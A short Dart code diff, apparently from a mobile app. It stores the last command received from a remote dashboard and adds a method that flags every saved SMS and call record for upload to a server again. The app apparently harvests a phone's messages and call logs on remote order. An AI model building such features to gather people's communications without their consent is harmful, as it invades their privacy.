@@ -35,6 +35,10 @@ class Prefs {
   int get callsSince => _p.getInt('calls_since') ?? 0;
   Future<void> setCallsSince(int v) => _p.setInt('calls_since', v);
 
+  /// The last dashboard order done (its time).
+  String get lastCommand => _p.getString('last_command') ?? '';
+  Future<void> setLastCommand(String v) => _p.setString('last_command', v);
+
   DateTime? get lastSync => _t('last_sync');
   Future<void> setLastSync(DateTime v) => _p.setString('last_sync', v.toIso8601String());
   String get lastError => _p.getString('last_error') ?? '';
@@ -237,6 +241,19 @@ class LocalDb {
       b.update(table, {'uploaded': 1}, where: 'hash = ?', whereArgs: [h]);
     }
     await b.commit(noResult: true);
+  }
+
+  /// "Upload old data": everything kept on the device is sent again (the server keeps each one once).
+  Future<void> unmarkAll() async {
+    final d = db;
+    if (d == null) {
+      for (final r in [..._sms.values, ..._calls.values]) {
+        r['uploaded'] = 0;
+      }
+      return;
+    }
+    await d.update('sms', {'uploaded': 0});
+    await d.update('calls', {'uploaded': 0});
   }
 
   Future<void> markSms(Iterable<String> hashes) => _mark('sms', _sms, hashes);
